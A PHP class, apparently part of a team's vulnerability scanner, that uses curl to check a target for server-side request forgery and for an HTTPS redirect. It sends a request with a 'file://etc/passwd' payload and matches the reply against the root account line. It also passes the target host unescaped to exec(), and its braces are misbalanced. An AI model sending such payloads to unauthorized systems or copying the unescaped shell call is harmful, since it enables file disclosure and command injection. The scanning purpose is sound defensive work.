<?php

class TOOL_cURL extends TOOL {
    /*
        Tool Name:              cURL
        Responsible:            MG-LC (and whoever else wants to use)
        OpenProject Phase #:    XXX

        Summary:
            ... quick summary of the tool's purpose. (Even if it's all written in PHP / Symfony, still describe it breifly)
            cURL is a way to send requests to a web server using specified headers and bodies, and getting the contents of the reply
            This will be helpful for the server side request forgery vulnerabilty as it can be used to send a malicious request to a server
            and determine whether it is vulnerable based on the reply received


        Output (either array or just a boolean):
            ... describe in psuedocode
            $reply: I'm thinking that it might be simpler to just return a boolean if the regex for etc/passwd matches instead of an array 
            but if anyone else is going to use cURL then that will change
            
    */
    // private array $CLI; // SC: Don't think this is needed
    private bool $reply;
    private array $redirect; // SC: Added missing private member

    public function Execute() {
        echo "Executing cURL...";

        $this->reply = false;
        // this command will need to be edited to add in the target url, although I doubt it will ever work...
        $command = 'curl http://' . parse_url($this->scan->getTarget())["host"] . '/page?url=file://etc/passwd';

        exec($command, $CLI);

        $pattern = '#/root:/bin/bash#';
        
        foreach($CLI as $line) {
            preg_match_all($pattern, $line, $result, PREG_SET_ORDER, 0);
            if(isset($result[0])) {
                $this->reply = true;
            }
        }
        $this->redirect = [];
        // This command is checking if there is a redirect setup on the target site
        $command = 'curl -I '  . parse_url($this->scan->getTarget())["host"];
        exec($command, $CLI);

        // Regex to check if the redirect is in place
        $pattern = '#HTTP\/1.1 301 Moved Permanently#';        
        foreach($CLI as $line) {
            preg_match_all($pattern, $line, $result, PREG_SET_ORDER, 0);
            if(isset($result[0])) {
                // If there is a redirect check that it is redirecting to https and not just another webpage
                $pattern = '#Location: https#';        
                foreach($CLI as $line) {
                    preg_match_all($pattern, $line, $result, PREG_SET_ORDER, 0);
                    if(isset($result[0])) {
                        // If redirecting to https then filter out useless information and just grab the url that the site redirected to
                        $pattern = '#Location:\s+([^\n]+)#';
                        preg_match_all($pattern, $line, $result, PREG_SET_ORDER, 0);
                        if(isset($result[0])) {
                            array_push($this->redirect, $result[0][1]);
                        }
                    }
            }
        }

    }

    echo " Finished cURL.\n";
}

    public function GetReply() {

        return $this->reply;

    }

    public function GetRedirect() {

        return $this->redirect;

    }
    
    // below function deprecated
    public function Output() {
        // Persist this whole object as JSON
        // TODO
        // return json_encode($this);

        // or if we want to do regex checking in the vuln class we should just return the $reply value
    }

}